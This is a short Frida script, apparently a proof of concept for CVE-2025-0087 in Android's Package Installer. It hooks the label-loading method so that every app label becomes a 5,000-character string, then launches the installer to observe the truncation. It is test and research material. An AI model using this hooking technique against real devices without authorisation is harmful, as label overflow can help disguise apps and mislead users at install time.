// TO BE RUN AS -U -n com.android.packageinstaller -l cve-2025-0087.js

Java.perform(function () {
    var PackageManager = Java.use("android.app.ApplicationPackageManager");
    var PackageItemInfo = Java.use("android.content.pm.PackageItemInfo");

    var targetPackage = "com.android.packageinstaller"; // Targeting Package Installer
    console.log("[*] Targeting package: " + targetPackage);

    Java.scheduleOnMainThread(function () {
        var context = Java.use("android.app.ActivityThread").currentApplication().getApplicationContext();
        var pm = context.getPackageManager();

        try {
            var packageInfo = pm.getPackageInfo(targetPackage, 0);
            console.log("[✔] Package found: " + packageInfo.packageName);

            // Hook loadLabel()
            PackageItemInfo.loadLabel.implementation = function (pm) {
                var result = this.loadLabel(pm);
                console.log("[*] Original Label: " + result);

                // Inject a long label for testing truncation
                var longLabel = "A".repeat(5000); // Overflow test
                console.warn("[!] Injecting long label for truncation test...");

                return longLabel; // Returning oversized label
            };

            // Launch Package Installer to observe the change
            var launchIntent = pm.getLaunchIntentForPackage(targetPackage);
            if (launchIntent) {
                context.startActivity(launchIntent);
                console.log("[✔] Launched package: " + targetPackage);
            } else {
                console.error("[!] Could not launch package.");
            }

        } catch (err) {
            console.error("[X] Package not found: " + err);
        }
    });
});

